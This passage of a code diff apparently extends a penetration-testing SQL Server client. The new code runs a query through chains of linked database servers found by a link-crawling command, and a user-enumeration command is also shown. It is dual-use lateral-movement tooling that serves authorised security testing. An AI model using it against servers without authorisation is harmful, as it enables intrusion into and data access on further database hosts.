+                    print("[*] No paths discovered yet. Running crawl_links first...")
+                    self.do_crawl_links("")
+                    # Check again after crawling
+                    if args[0] in self.server_to_paths:
+                        server_name = args[0]
+                        query = ' '.join(args[1:])
+                        paths_to_try = self.server_to_paths[server_name].copy()
+                        print(f"[*] Found {len(paths_to_try)} path(s) to server '{server_name}'")
+                    else:
+                        # No path indicator, treat all as query and use all paths
+                        query = ' '.join(args)
+                        paths_to_try = self.discovered_paths.copy()
+                else:
+                    # No path indicator, treat all as query and use all paths
+                    query = ' '.join(args)
+                    paths_to_try = self.discovered_paths.copy()
+            
+            if not query:
+                print("[-] No query provided")
+                return
+            
+            # Try query on each path
+            success_count = 0
+            for link_path in paths_to_try:
+                try:
+                    path_display = '->'.join(link_path) if link_path else 'LOCAL'
+                    print(f"\n[*] Trying path: {path_display}")
+                    
+                    # Build query through link path
+                    if link_path:
+                        final_query = self.build_link_query(link_path, query)
+                    else:
+                        final_query = query
+                    
+                    if self.show_queries:
+                        print(f"[%] {final_query}")
+                    
+                    result = self.sql_query(final_query, show=False)
+                    self.print_replies()
+                    if result:
+                        print(f"[+] Success on path: {path_display}")
+                        self.sql.rows = result
+                        self.sql.printRows()
+                        success_count += 1
+                    else:
+                        print(f"[-] No results on path: {path_display}")
+                except Exception as e:
+                    print(f"[-] Error on path {path_display}: {e}")
+            
+            print(f"\n[+] Query execution complete. Success on {success_count}/{len(paths_to_try)} paths.")
+        except Exception as e:
+            print(f"[-] Error executing query: {e}")
 
     def do_enum_users(self, line):
         self.sql_query("EXEC sp_helpuser")
